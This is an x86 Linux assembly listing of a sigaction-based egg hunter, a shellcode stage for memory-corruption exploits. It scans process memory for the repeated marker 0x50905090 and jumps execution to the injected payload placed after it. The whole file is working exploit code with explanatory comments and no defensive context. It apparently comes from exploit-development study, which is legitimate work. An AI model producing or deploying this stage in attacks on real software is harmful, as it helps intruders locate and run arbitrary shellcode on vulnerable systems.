
global _start

section .text

_start:

align_page:
	or cx,0xfff		; page alignment

next_address:

	inc ecx			; increment memory pointer
	jnz not_null		; skip ecx = 0 situation
	inc ecx
not_null:

	; sigaction, eax = 67, ebx = 0, ecx = memory address to test

	push byte +0x43		;
	pop eax			; syscall = 67 (sigaction)
	int 0x80		;

	; Check the return value, eax == 0xf2 (EFAULT)

	cmp al,0xf2		; did we get an EFAULT?
	jz align_page		; invalid pointer - try with the next page

	; Valid memory, try to find the EGG

	mov eax, 0x50905090	; place the egg in eax
	mov edi, ecx		; address to be validated
	scasd			; compare eax / edi and increment edi by 4 bytes
	jnz next_address	; no match - try with the next address
	scasd			; first 4 bytes matched, what about the other half?
	jnz next_address	; no match - try with the next address

	; EGG found, execute it

	jmp edi			; egg found! jump to our payload
